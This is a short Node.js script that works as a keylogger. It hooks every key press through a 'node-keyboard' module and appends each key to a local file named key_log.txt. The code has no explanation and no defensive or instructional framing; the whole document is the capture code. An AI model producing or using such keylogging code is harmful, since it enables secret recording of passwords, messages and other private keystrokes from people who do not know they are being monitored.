const keyboard = require('node-keyboard');
const fs = require('fs');

const logFile = 'key_log.txt';

keyboard.on('key', (key) => {
  fs.appendFile(logFile, `Key pressed: ${key}\n`, (err) => {
    if (err) {
      console.error(err);
    }
  });
});

keyboard.start();